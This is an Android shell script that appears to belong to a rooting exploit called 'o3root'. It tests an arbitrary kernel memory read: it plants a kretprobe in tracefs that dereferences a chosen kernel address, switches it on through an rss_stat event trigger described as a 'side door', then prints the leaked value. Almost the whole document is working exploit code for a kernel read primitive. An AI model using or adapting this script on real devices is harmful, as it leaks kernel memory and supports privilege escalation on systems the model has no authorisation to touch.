#!/system/bin/sh
# Verify the tracefs-based arbitrary kernel read primitive used by o3root.
# Read-only: creates a kretprobe that dereferences one address, triggers it,
# prints the traced value, then removes the probe. No kernel writes.
TR=/sys/kernel/tracing
ADDR=${1:-0xffffffc0826d10d8}

echo "[*] addr=$ADDR"

# clean any leftovers
echo "-:t2r/gp" >> $TR/kprobe_events 2>/dev/null
echo "!enable_event:t2r:gp" > $TR/events/kmem/rss_stat/trigger 2>/dev/null

# create a kretprobe that reads 8 bytes at ADDR
printf "r:t2r/gp __arm64_sys_getpid a0=@%s:x64\n" "$ADDR" >> $TR/kprobe_events 2>/data/local/tmp/kp2.err
if ! grep -q "t2r/gp" $TR/kprobe_events; then
    echo "[!] probe create failed:"; cat /data/local/tmp/kp2.err
    exit 1
fi
echo "[+] probe created: $(grep 't2r/gp' $TR/kprobe_events)"

# enable it through the rss_stat trigger side door
echo "enable_event:t2r:gp" > $TR/events/kmem/rss_stat/trigger
echo "[+] trigger written"

# trace window
: > $TR/trace
echo 1 > $TR/tracing_on
/system/bin/true
/system/bin/true
echo 0 > $TR/tracing_on

echo "[*] hits: $(grep -c 'gp:' $TR/trace)"
grep 'gp:' $TR/trace | head -3

# cleanup
echo "!enable_event:t2r:gp" > $TR/events/kmem/rss_stat/trigger 2>/dev/null
echo "-:t2r/gp" >> $TR/kprobe_events 2>/dev/null
echo "[+] cleaned up; remaining probes:"
grep -c . $TR/kprobe_events
